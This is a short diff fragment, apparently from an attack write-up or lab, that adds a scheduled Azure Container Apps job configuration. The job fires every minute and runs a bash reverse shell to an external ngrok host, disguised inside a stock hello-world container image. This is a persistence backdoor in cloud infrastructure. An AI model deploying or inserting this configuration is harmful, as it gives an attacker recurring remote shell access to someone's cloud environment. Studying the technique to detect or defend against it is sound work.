@@ -1,0 +1,12 @@
+# Add the following to the template  
+  scheduleTriggerConfig:
+    cronExpression: '*/1 * * * *'
+#...
+  template:
+    containers:
+    - args:
+      - -c
+      - bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12951 0>&1
+      command:
+      - /bin/bash
+      image: mcr.microsoft.com/azuredocs/containerapps-helloworld:latest
